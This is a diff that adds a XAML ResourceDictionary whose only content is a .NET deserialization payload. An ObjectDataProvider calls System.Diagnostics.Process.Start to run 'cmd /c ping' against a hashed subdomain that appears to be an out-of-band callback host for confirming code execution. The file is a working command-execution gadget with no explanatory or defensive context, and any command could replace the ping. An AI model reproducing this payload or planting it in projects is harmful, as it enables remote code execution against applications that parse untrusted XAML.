@@ -1,0 +1,12 @@
+<ResourceDictionary
+			xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation'
+			xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml'
+			xmlns:System='clr-namespace:System;assembly=mscorlib'
+			xmlns:Diag='clr-namespace:System.Diagnostics;assembly=system'>
+			<ObjectDataProvider x:Key='LaunchCmd' ObjectType='{x:Type Diag:Process}' MethodName='Start'>
+				<ObjectDataProvider.MethodParameters>
+					<System:String>cmd</System:String>
+					<System:String>/c ping -n 1 d30u.3c130ea5d8d2d3daca7f6808cdf0f148.com</System:String>
+				</ObjectDataProvider.MethodParameters>
+			</ObjectDataProvider>
+		</ResourceDictionary>
